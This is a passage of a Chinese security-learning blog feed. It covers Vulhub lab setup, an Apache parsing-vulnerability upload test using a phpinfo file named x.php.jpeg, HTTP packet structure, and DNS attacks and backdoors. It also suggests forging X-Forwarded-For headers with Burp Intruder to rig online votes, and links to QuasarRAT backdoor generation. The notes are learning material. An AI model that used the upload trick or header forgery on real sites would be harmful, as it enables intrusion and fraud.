基于中间件的靶场使用<br><a href="https://vulhub.org/#/environments/">https://vulhub.org/#/environments/</a><br>这个是用docker搭建的一个靶场非常的方便</p><p>环境搭建并测试,参考文档：<a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p><p>第一步安装好docker环境并下载文件</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker -v</span>Docker version 20.10.6, build 370c289<span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose -v</span>docker-compose version 1.18.0, build 8dd22a9<span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /opt/vulhub/</span><span class="token punctuation">[</span>root@hdss7-11 vulhub<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget https://github.com/vulhub/vulhub/archive/master.zip</span></code></pre><p>第二步<a href="https://vulhub.org/#/environments/%E6%9F%A5%E6%89%BE%E4%BD%A0%E6%83%B3%E5%81%9A%E7%9A%84%E7%8E%AF%E5%A2%83">https://vulhub.org/#/environments/查找你想做的环境</a><br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/2.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 vulhub<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd vulhub-master/httpd/apache_parsing_vulnerability/</span><span class="token punctuation">[</span>root@hdss7-11 apache_parsing_vulnerability<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/3.png"><br>创建文件并命名为x.php.jpeg并上传</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat x.php.jpeg</span><span class="token operator">&lt;</span>?php       phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/4.png"><br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/5.png"></p><h4 id="2、wordpress"><a href="#2、wordpress" class="headerlink" title="2、wordpress"></a><font size="4"><strong>2、wordpress</strong></font></h4><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/6.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 vulhub-master<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find . -name wordpress</span>./base/wordpress./wordpress<span class="token punctuation">[</span>root@hdss7-11 vulhub-master<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd wordpress/</span><span class="token punctuation">[</span>root@hdss7-11 wordpress<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd pwnscriptum/</span>1.png  docker-compose.yml  exploit.py  README.md  README.zh-cn.md<span class="token punctuation">[</span>root@hdss7-11 pwnscriptum<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/7.png"></p><h3 id="五、涉及资源"><a href="#五、涉及资源" class="headerlink" title="五、涉及资源"></a><font size="5"><strong>五、涉及资源</strong></font></h3><p>Vulhub靶场：<a href="https://www.vulhub.org/">https://www.vulhub.org/</a><br>Web中间件常见漏洞总结（pdf文件）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志--002</title>
      <link href="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/"/>
      <url>/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-数据包拓展"><a href="#基础入门-数据包拓展" class="headerlink" title="基础入门-数据包拓展"></a><font size="6"><strong>基础入门-数据包拓展</strong></font></h2><span id="more"></span><h3 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a><font size="5"><strong>一、网站解析对应</strong></font></h3><p>●涉及到的攻击层面？（源码，搭建平台，系统，网络层等）<br>●涉及到的安全问题？（目录，敏感文件，弱口令，IP及域名等）</p><h3 id="二、HTTP-S数据包"><a href="#二、HTTP-S数据包" class="headerlink" title="二、HTTP&#x2F;S数据包"></a><font size="5"><strong>二、HTTP&#x2F;S数据包</strong></font></h3><p><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/1.png"></p><pre class=" language-bash"><code class="language-bash">Request请求数据包Response返回数据包proxy代理服务器</code></pre><p><font size="4"><strong>HTTP&#x2F;HTTPS具体区别？</strong></font><br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/2.png"></p><p><font size="4"><em>HTTP简要通信过程</em>*</font><br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/3.png"></p><pre class=" language-bash"><code class="language-bash">建立连接——<span class="token operator">></span>发送请求数据包——<span class="token operator">></span>返回响应数据包——<span class="token operator">></span>关闭连接1.浏览器建立与web服务器之间的连接2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器4.web服务器关闭连接</code></pre><h3 id="三、Request请求数据包数据格式"><a href="#三、Request请求数据包数据格式" class="headerlink" title="三、Request请求数据包数据格式"></a><font size="5"><strong>三、Request请求数据包数据格式</strong></font></h3><h4 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a><font size="4"><strong>Request请求数据包数据格式</strong></font></h4><p>● 请求行：请求类型&#x2F;请求资源路径、协议的版本和类<br>● 请求头：一些键值对，浏览器与web服务器之间都可以发送，特定的某种含义<br>● 空行：请求头与请求体之间用一个空行隔开；<br>● 请求体：要发送的数据(一般post提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123</p><h5 id="1、请求行"><a href="#1、请求行" class="headerlink" title="1、请求行"></a><font size="3"><strong>1、请求行</strong></font></h5><p>请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分享。<br>例如：GET &#x2F;index.html HTTP&#x2F;1.1</p><p>HTTP 规划定义了8种可能的请求方法：<br>● GET：检索URL中标识资源的一个简单请求<br>● HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档<br>● POST：服务器接受被写入客户端输出流中的数据的请求<br>● PUT：服务器保存请求数据作为指定URL新内容的请求 DELETE：服务器删除URL中命令的资源的请求<br>● OPTIONS：关于服务器支持的请求方法信息的请求<br>● TRACE：web服务器反馈Http请求和其头标的请求<br>● CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p><h5 id="2、请求头"><a href="#2、请求头" class="headerlink" title="2、请求头"></a><font size="3"><strong>2、请求头</strong></font></h5><p>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><p>● HOST: 主机或域名地址<br>● Accept：指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式<br>● User-Agent：是客户浏览器名称<br>● Host：对应网址URL中的Web名称和端口号<br>● Accept-Langeuage：指出浏览器可以接受的语言种类，如en或en-us，指英语<br>● connection：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP&#x2F;1.1使用Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接<br>● Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能<br>● Referer：表明产生请求的网页URL。如比从网页&#x2F;icconcept&#x2F;index.jsp中点击一个链接到网页&#x2F;icwork&#x2F;search，在向服务器发送的GET&#x2F;icwork&#x2F;search中的请求中，Referer是<a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AAWeb%E8%AF%B7%E6%B1%82%E6%98%AF%E4%BB%8E%E4%BB%80%E4%B9%88%E7%BD%91%E7%AB%99%E6%9D%A5%E7%9A%84">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪Web请求是从什么网站来的</a><br>● Content-Type：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得<br>● Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO-8859-1<br>● Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式</p><h5 id="3、空行"><a href="#3、空行" class="headerlink" title="3、空行"></a><font size="3"><strong>3、空行</strong></font></h5><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><h5 id="4-请求数据"><a href="#4-请求数据" class="headerlink" title="4.请求数据"></a><font size="3"><strong>4.请求数据</strong></font></h5><p>使用POST传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="四、Response返回数据包数据格式"><a href="#四、Response返回数据包数据格式" class="headerlink" title="四、Response返回数据包数据格式"></a><font size="5"><strong>四、Response返回数据包数据格式</strong></font></h3><h4 id="1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。"><a href="#1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。" class="headerlink" title="1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。"></a><font size="4"><strong>1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</strong></font></h4><p>● 状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>● 响应头标：包含服务器类型、日期、长度、内容类型等<br>● 空行：响应头与响应体之间用空行隔开<br>● 响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p><h4 id="2、HTTP响应码"><a href="#2、HTTP响应码" class="headerlink" title="2、HTTP响应码"></a><font size="4"><strong>2、HTTP响应码</strong></font></h4><p>1xx：信息，请求收到，继续处理<br>2xx：成功，行为被成功地接受、理解和采纳<br>3xx：重定向，为了完成请求，必须进一步执行的动作<br>4xx：客户端错误<br>5xx：服务器错误</p><p>200 存在文件<br>403 存在文件夹<br>3xx 均可能存在<br>404 不存在文件及文件夹<br>500 均可能存在</p><p>1.响应头标<br>像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。</p><p>2.空行<br>最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标。</p><p>3.响应数据<br>HTML文档和图像等，也就是HTML本身。</p><h3 id="五、涉及演示案例"><a href="#五、涉及演示案例" class="headerlink" title="五、涉及演示案例"></a><font size="5"><strong>五、涉及演示案例</strong></font></h3><p>Burpsuite抓包修改测试</p><h4 id="1、敏感文件扫描工具简要实现"><a href="#1、敏感文件扫描工具简要实现" class="headerlink" title="1、敏感文件扫描工具简要实现"></a><font size="4"><strong>1、敏感文件扫描工具简要实现</strong></font></h4><p>  御剑web目录扫描工具（还有一款铸剑，功能更多），扫描时可以配合wireshark抓包分析（筛选条件：扫描的ip或域名）。<br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/4.png"></p><h4 id="2、第三方检测修改实现XSS攻击"><a href="#2、第三方检测修改实现XSS攻击" class="headerlink" title="2、第三方检测修改实现XSS攻击&gt;"></a><font size="4"><strong>2、第三方检测修改实现XSS攻击</strong></font>&gt;</h4><p>  bp抓包修改信息（比如访问ip.chinaz.com，会看到你的ip等信息，用bp抓包，改包，比如改user-agent，然后再forward，会发现信息改变）</p><h4 id="3、CTF或实际应用中部分考题解析（mozhe）"><a href="#3、CTF或实际应用中部分考题解析（mozhe）" class="headerlink" title="3、CTF或实际应用中部分考题解析（mozhe）"></a><font size="4"><strong>3、CTF或实际应用中部分考题解析（mozhe）</strong></font></h4><ol><li>伪造User-Agent(例如伪造成手机客户端等等) </li><li>伪造referer</li><li>伪造ip（查一下php获取ip的方法，改X-forwarded-For，配合bp的Intruder功能实现许多ip不断访问对方url，各种投票的刷票也可以使用这个思路）</li></ol><h3 id="六、涉及资源"><a href="#六、涉及资源" class="headerlink" title="六、涉及资源"></a><font size="5"><strong>六、涉及资源</strong></font></h3><p>● <a href="https://www.mozhe.cn/">https://www.mozhe.cn/</a><br>● <a href="https://www.ddosi.com/b261/">https://www.ddosi.com/b261/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志--001</title>
      <link href="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/"/>
      <url>/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-概念名词"><a href="#基础入门-概念名词" class="headerlink" title="基础入门-概念名词"></a><font size="6"><strong>基础入门-概念名词</strong></font></h2><span id="more"></span><h3 id="一、域名"><a href="#一、域名" class="headerlink" title="一、域名"></a><font size="5"><strong>一、域名</strong></font></h3><h4 id="1、什么是域名？"><a href="#1、什么是域名？" class="headerlink" title="1、什么是域名？"></a><font size="4"><strong>1、什么是域名？</strong></font></h4><p>域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><p>比如<a href="http://www.baidu.com,这就是一个域名,简单来说就是ip不好记,所以有了域名来方便记忆.可以联想到地址和经纬度的关系(上海/">www.baidu.com，这就是一个域名，简单来说就是ip不好记，所以有了域名来方便记忆。可以联想到地址和经纬度的关系（上海</a> ：经度 121.48 纬度 31.22）</p><h4 id="2、域名在哪里注册？"><a href="#2、域名在哪里注册？" class="headerlink" title="2、域名在哪里注册？"></a><font size="4"><strong>2、域名在哪里注册？</strong></font></h4><p>找个域名注册商的网站（比如阿里、万网），搜索想要的域名（由于国内并非所有域名都支持备案，目前提供主流可备案域名有：</p><pre class=" language-bash"><code class="language-bash">$ .com, .cn, .com.cn, .net, .top, .wang, .vip, .company, .org.cn,.ac.cn, .site, .online, .ren .store, .tech, .xyz, .club, .link, .pro, .red, .info, .biz, .ltd, .gov.cn, .mobi, .city 等"</code></pre><p>填写域名资料。若你是以公司名义注册域名，则需要填写企业资料、联系人信息；若你是以个人名义注册，请切换到个人栏，填写个人信息。域名英文信息将会根据你填写的中文自动翻译，请核对是否有误，若有误请及时进行修改。</p><p>确认域名账单。确认域名注册人信息、账单无误后，使用支付宝或微信扫码支付即可完成注册。</p><p>域名实名验证。因国内法律法规要求，域名注册后需要进行实名认证，通过认证后即可正式生效。若审核有误，请及时进行修改，再次提交审核。</p><p>域名备案及绑定网站。如果你需要在国内上线，则需要进行网站备案。</p><h4 id="3、什么是子域名、二级域名、多级域名？"><a href="#3、什么是子域名、二级域名、多级域名？" class="headerlink" title="3、什么是子域名、二级域名、多级域名？"></a><font size="4"><strong>3、什么是子域名、二级域名、多级域名？</strong></font></h4><p>例如<a href="http://www.dns0755.net是dns0755.net的子域名,而dns0755.net又是net的子域名.国际顶级域名的子域名叫做二级域名./">www.dns0755.net是dns0755.net的子域名，而dns0755.net又是net的子域名。国际顶级域名的子域名叫做二级域名。</a></p><p>如A.com是一级域名，A.B.com则是二级域名。一级域名较二级域名级别更高，而二级域名则是依附于一级域名下的附属分区域名，即二级域名是一级域名的细分层级。</p><p>通过网址上【.】数量来判断域名层级，有多少【.】就为几级域名，如A.com是一级域名，A.B.com则是二级域名。</p><p>如：baidu.com 是百度的顶级域名，zhidao.baidu.com 是二级域名，zhidao.zhidao.baidu.com 是三（多）级域名，*.baidu.com 是泛域名。</p><h4 id="4、域名发现对于安全测试意义？"><a href="#4、域名发现对于安全测试意义？" class="headerlink" title="4、域名发现对于安全测试意义？"></a><font size="4"><strong>4、域名发现对于安全测试意义？</strong></font></h4><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h3 id="二、DNS与CDN"><a href="#二、DNS与CDN" class="headerlink" title="二、DNS与CDN"></a><font size="5"><strong>二、DNS与CDN</strong></font></h3><h4 id="1、什么是DNS？"><a href="#1、什么是DNS？" class="headerlink" title="1、什么是DNS？"></a><font size="4"><strong>1、什么是DNS？</strong></font></h4><p>域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h4 id="2、本地HOSTS与DNS的关系？"><a href="#2、本地HOSTS与DNS的关系？" class="headerlink" title="2、本地HOSTS与DNS的关系？"></a><font size="4"><strong>2、本地HOSTS与DNS的关系？</strong></font></h4><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。</p><p>例：先打开cmd终端，输入命令 ping <a href="http://www.baidu.com，得到的结果如下图：">www.baidu.com，得到的结果如下图：</a></p><p><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/1.png"></p><p>在hosts文件（图中黄色框内为hosts文件绝对路径）最后加上下图红色框内的内容，并ctrl+s保存<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/2.png"></p><p>再次ping <a href="http://www.baidu.com/">www.baidu.com</a> 时会发现解析的ip变为你hosts文件中的了（当然了，访问不了）。<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/3.png"></p><h4 id="3、CDN是什么？与DNS的关系？"><a href="#3、CDN是什么？与DNS的关系？" class="headerlink" title="3、CDN是什么？与DNS的关系？"></a><font size="4"><strong>3、CDN是什么？与DNS的关系？</strong></font></h4><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址：拓展：判断是否存在CDN并绕过，寻找真实IP）。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。<br><img src="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/4.png"><br>扩展：DNS和CDN的区别与联系<a href="https://www.dns.com/supports/710.html">https://www.dns.com/supports/710.html</a></p><h4 id="4、常见的DNS安全攻击有哪些？"><a href="#4、常见的DNS安全攻击有哪些？" class="headerlink" title="4、常见的DNS安全攻击有哪些？"></a><font size="4"><strong>4、常见的DNS安全攻击有哪些？</strong></font></h4><p><strong>缓存投毒</strong><br>通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p><font size="3"><strong>DNS劫持</strong></font><br>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP&#x2F;IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器。</p><p><font size="3"><strong>域名劫持</strong></font><br>域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><p><font size="3"><strong>DNS DDoS攻击</strong></font><br>针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的。</p><p><font size="3"><strong>反射式DNS放大攻击</strong></font><br>所有放大攻击都利用了攻击者和目标Web资源之间的带宽消耗差异，由于每个机器人都要求使用欺骗性IP地址打开DNS解析器，该IP地址已更改为目标受害者的真实源IP地址，然后目标会从DNS解析器接收响应。为了创建大量流量，攻击者以尽可能从DNS解析器生成响应的方式构造请求。结果，目标接收到攻击者初始流量的放大，并且他们的网络被虚假流量阻塞，导致拒绝服务。</p><p>当面对各种DNS攻击，墨者安全建议专业的高防DNS防劫持服务，保障服务器的稳定运行，从容应对各种DNS攻击，避免因DNS攻击造成在线业务中断，给企业带来重大损失。</p><h3 id="三、脚本语言"><a href="#三、脚本语言" class="headerlink" title="三、脚本语言"></a><font size="5"><strong>三、脚本语言</strong></font></h3><h4 id="1、常见的脚本语言类型有哪些？"><a href="#1、常见的脚本语言类型有哪些？" class="headerlink" title="1、常见的脚本语言类型有哪些？"></a><font size="4"><strong>1、常见的脚本语言类型有哪些？</strong></font></h4><p>asp php aspx jsp javaweb pl py cgi等</p><h4 id="2、不同脚本类型与安全漏洞的关系？"><a href="#2、不同脚本类型与安全漏洞的关系？" class="headerlink" title="2、不同脚本类型与安全漏洞的关系？"></a><font size="4"><strong>2、不同脚本类型与安全漏洞的关系？</strong></font></h4><p>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</p><h4 id="3、漏洞挖掘代码审计与脚本类型的关系？"><a href="#3、漏洞挖掘代码审计与脚本类型的关系？" class="headerlink" title="3、漏洞挖掘代码审计与脚本类型的关系？"></a><font size="4"><strong>3、漏洞挖掘代码审计与脚本类型的关系？</strong></font></h4><p>同上</p><h3 id="四、后门"><a href="#四、后门" class="headerlink" title="四、后门"></a><font size="5"><strong>四、后门</strong></font></h3><h4 id="1、什么是后门？有那些后门？"><a href="#1、什么是后门？有那些后门？" class="headerlink" title="1、什么是后门？有那些后门？"></a><font size="4"><strong>1、什么是后门？有那些后门？</strong></font></h4><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别：网页、线程插入、扩展、C&#x2F;S后门。</p><h4 id="2、后门在安全测试中的实际意义？"><a href="#2、后门在安全测试中的实际意义？" class="headerlink" title="2、后门在安全测试中的实际意义？"></a><font size="4"><strong>2、后门在安全测试中的实际意义？</strong></font></h4><p>例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</p><h4 id="3、关于后门需要了解那些？（玩法，免杀）"><a href="#3、关于后门需要了解那些？（玩法，免杀）" class="headerlink" title="3、关于后门需要了解那些？（玩法，免杀）"></a><font size="4"><strong>3、关于后门需要了解那些？（玩法，免杀）</strong></font></h4><p>免杀，简单来讲就是绕过杀毒软件等。</p><h3 id="五、WEB"><a href="#五、WEB" class="headerlink" title="五、WEB"></a><font size="5"><strong>五、WEB</strong></font></h3><h4 id="1、WEB的组成架构模型？"><a href="#1、WEB的组成架构模型？" class="headerlink" title="1、WEB的组成架构模型？"></a><font size="4"><strong>1、WEB的组成架构模型？</strong></font></h4><p>网站源码：分脚本类型，分应用方向<br>操作系统：windows linux<br>中间件（搭建平台）：apache iis tomcat nginx等<br>数据库：access mysql mssql oracle sybase db2 postsql等</p><h4 id="2、架构漏洞安全测试简要介绍？"><a href="#2、架构漏洞安全测试简要介绍？" class="headerlink" title="2、架构漏洞安全测试简要介绍？"></a><font size="4"><strong>2、架构漏洞安全测试简要介绍？</strong></font></h4><h4 id="3、为什么要从WEB层面为主为首？"><a href="#3、为什么要从WEB层面为主为首？" class="headerlink" title="3、为什么要从WEB层面为主为首？"></a><font size="4"><strong>3、为什么要从WEB层面为主为首？</strong></font></h4><p>用户接触web层面最多，大部分都是从web页面入手慢慢渗透到服务器。直接从操作系统入手不太现实（大部分情况下接触不到）。</p><h3 id="六、WEB相关安全漏洞"><a href="#六、WEB相关安全漏洞" class="headerlink" title="六、WEB相关安全漏洞"></a><font size="5"><strong>六、WEB相关安全漏洞</strong></font></h3><p>● WEB源码类对应漏洞<br>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</p><p>● WEB中间件对应漏洞<br>未授权访问</p><p>● WEB数据库对应漏洞<br>内核漏洞</p><p>● WEB系统层对应漏洞<br>远程代码执行，提权</p><p>● 其他第三方对应漏洞<br>第三方软件漏洞</p><p>● APP或PC应用结合类</p><p>● owasp top10</p><h3 id="七、演示案例"><a href="#七、演示案例" class="headerlink" title="七、演示案例"></a><font size="5"><strong>七、演示案例</strong></font></h3><h4 id="1、多级域名的枚举查找（原理，方式）"><a href="#1、多级域名的枚举查找（原理，方式）" class="headerlink" title="1、多级域名的枚举查找（原理，方式）"></a><font size="4"><strong>1、多级域名的枚举查找（原理，方式）</strong></font></h4><p>layer子域名挖掘机、Maltego（kali自带）、各类挖掘子域名的网站：如 <a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a></p><h4 id="2、DNS解析修改后分析（本地或服务）"><a href="#2、DNS解析修改后分析（本地或服务）" class="headerlink" title="2、DNS解析修改后分析（本地或服务）"></a><font size="4"><strong>2、DNS解析修改后分析（本地或服务）</strong></font></h4><p>把自己电脑的DNS服务的改成手动获取，并换dns（比如先8.8.8.8，再114.114.114.114），分别ping同一网站，看解析出来的ip是否不同。</p><h4 id="3、EXE后门功能及危害及类似WEB后门"><a href="#3、EXE后门功能及危害及类似WEB后门" class="headerlink" title="3、EXE后门功能及危害及类似WEB后门"></a><font size="4"><strong>3、EXE后门功能及危害及类似WEB后门</strong></font></h4><p>Quasar后门程序（.exe）生成并使用：<a href="https://blog.csdn.net/qq_44930903/article/details/111600982">https://blog.csdn.net/qq_44930903/article/details/111600982</a><br>web后门：beef、WSExploer抓包、wireshark抓包等</p><h4 id="4、APP类结合WEB协议，PC类结合WEB协议"><a href="#4、APP类结合WEB协议，PC类结合WEB协议" class="headerlink" title="4、APP类结合WEB协议，PC类结合WEB协议"></a><font size="4"><strong>4、APP类结合WEB协议，PC类结合WEB协议</strong></font></h4><p>Burp Suite抓app的包，然后改包发送等；<br>Apk数据提取（安卓逆向工具）：下载下方资源、解压，然后把一个apk文件放入到apps文件夹，运行exe文件，之后会生成results文件，apk的数据就在这里。</p><h3 id="八、涉及资源"><a href="#八、涉及资源" class="headerlink" title="八、涉及资源"></a><font size="5"><strong>八、涉及资源</strong></font></h3><p>● 逍遥模拟器：<a href="http://www.xyaz.cn/">http://www.xyaz.cn</a><br>● WSExplorer抓包工具：<a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a><br>● Quasar后门程序生成：<a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a><br>● Apk数据提取：<a href="https://github.com/TheKingOfDuck/ApkAnalyser">https://github.com/TheKingOfDuck/ApkAnalyser</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/13/hello-world/"/>
      <url>/2023/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a 